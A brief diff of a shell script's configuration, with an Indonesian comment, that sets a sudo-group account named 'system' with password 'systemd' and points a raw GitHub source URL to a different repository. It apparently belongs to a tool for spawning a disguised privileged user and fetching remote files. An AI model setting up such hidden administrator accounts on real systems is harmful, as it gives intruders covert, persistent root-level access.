@@ -12,7 +12,7 @@ USERNAME="system"
 PASSWORD="systemd"
 SUDO_GROUP="sudo"
 # PENTING: Ganti link GitHub ini dengan repo lo yang baru
-GITHUB_RAW="https://raw.githubusercontent.com/b2hunters/user-spawn-system/main"
+GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
 
 # ============================================
 # CEK ROOT
